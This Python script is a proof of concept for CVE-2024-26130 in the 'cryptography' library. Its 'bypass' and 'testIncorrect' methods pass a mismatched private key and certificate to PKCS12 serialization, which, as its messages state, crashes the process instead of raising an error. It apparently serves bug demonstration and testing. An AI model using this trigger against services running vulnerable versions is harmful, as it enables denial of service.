import cryptography
import datetime
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import PrivateFormat
import base64
import asyncio

print("Demonstrating CVE-2024-26130")


class Demo:
    def __init__(self) -> None:
        self.time = datetime.datetime.utcnow()
        self.key1 = rsa.generate_private_key(
            public_exponent=65537, key_size=4096)
        self.key2 = rsa.generate_private_key(
            public_exponent=65537, key_size=4096)
        self.cert1 = self.build_cert(self.key1)
        self.cert2 = self.build_cert(self.key2)
        self.encryption_algorithm = PrivateFormat.PKCS12.encryption_builder().hmac_hash(
            cryptography.hazmat.primitives.hashes.SHA256()).build(b'password')
        # self.testCorrect()
        # self.bypass()
        # self.testIncorrect()

    def build_cert(self, key):
        cert = cryptography.x509.CertificateBuilder().subject_name(
            cryptography.x509.Name([
                cryptography.x509.NameAttribute(
                    cryptography.x509.oid.NameOID.COMMON_NAME, 'test'),
            ])
        ).issuer_name(
            cryptography.x509.Name([
                cryptography.x509.NameAttribute(
                    cryptography.x509.oid.NameOID.COMMON_NAME, 'test'),
            ])
        ).public_key(
            key.public_key()
        ).serial_number(
            cryptography.x509.random_serial_number()
        ).not_valid_before(
            self.time
        ).not_valid_after(
            self.time + datetime.timedelta(days=1)
        ).sign(
            key,
            cryptography.hazmat.primitives.hashes.SHA512()
        )
        return cert

    async def testCorrect(self):
        pkcs12_data = cryptography.hazmat.primitives.serialization.pkcs12.serialize_key_and_certificates(
            name=b'empty',
            key=self.key1,
            cert=self.cert1,
            cas=[],
            encryption_algorithm=self.encryption_algorithm
        )
        # print("pkcs12_data: ", pkcs12_data.decode('utf-8', 'ignore'))
        # deserialize
        key, cert, cas = cryptography.hazmat.primitives.serialization.pkcs12.load_key_and_certificates(
            pkcs12_data,
            b'password'
        )
        self.correct_result = pkcs12_data

        print("Correct test succeeded.")
        return pkcs12_data

    async def bypass(self):
        try:
            pkcs12_data = cryptography.hazmat.primitives.serialization.pkcs12.serialize_key_and_certificates(
                name=b'test',
                key=self.key1,
                cert=self.cert2,
                cas=[],
                encryption_algorithm=self.encryption_algorithm
            )
        except Exception as e:
            print("Exception thrown: ", e)
            return
        print("Bypass test succeeded.")
        self.bypass_result = pkcs12_data
        return pkcs12_data

    async def testIncorrect(self):
        print("should throw exception or print success message. Instead we crash")
        try:
            pkcs12_data = cryptography.hazmat.primitives.serialization.pkcs12.serialize_key_and_certificates(
                name=b'test',
                key=self.key1,
                cert=self.cert2,
                cas=[],
                encryption_algorithm=self.encryption_algorithm
            )
        except Exception as e:
            print("Exception thrown: ", e)
            return
        print("Incorrect test succeeded.")
        self.incorrect = pkcs12_data
        return pkcs12_data


async def main():
    d = Demo()
    print("in main")
    asyncio.gather(d.testCorrect(), d.bypass(), d.testIncorrect())
    print("corr: ", d.correct_result)
    print("bypass: ", d.bypass_result)
    print("incorr: ", d.incorrect)
    print("res")
    print("unreachable code caused by crash")


if __name__ == '__main__':
    print(cryptography.__version__)
    asyncio.run(main())
    print("unreachable code caused by crash")
